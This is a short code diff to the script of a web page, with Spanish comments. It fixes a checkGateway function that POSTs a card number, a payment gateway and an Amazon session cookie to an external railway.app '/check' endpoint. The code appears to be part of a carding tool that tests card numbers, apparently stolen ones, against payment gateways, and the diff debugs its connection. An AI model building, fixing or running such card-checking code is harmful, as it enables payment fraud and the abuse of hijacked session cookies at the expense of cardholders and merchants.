@@ -134,12 +134,19 @@
 
     async function checkGateway(cc, gateway) {
         try {
-            const response = await fetch('https://web-production-94347.up.railway.app/dashboard', {
+            const response = await fetch('https://web-production-94347.up.railway.app/check', {  // <-- URL correcta, apunta a /check
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ cc: cc, gateway: gateway, cookie: amazonCookie })
             });
-            return await response.json();
+            
+            // Leer texto y tratar de parsear JSON para debug en caso de error
+            const text = await response.text();
+            try {
+                return JSON.parse(text);
+            } catch (e) {
+                return { status: 'error', message: `Respuesta no JSON del servidor: ${text}`, cc: cc };
+            }
         } catch (err) {
             return { status: 'error', message: `Error de conexión: ${err.message}`, cc: cc };
         }
@@ -153,6 +160,7 @@
 
 </body>
 </html>
+
 
 
 
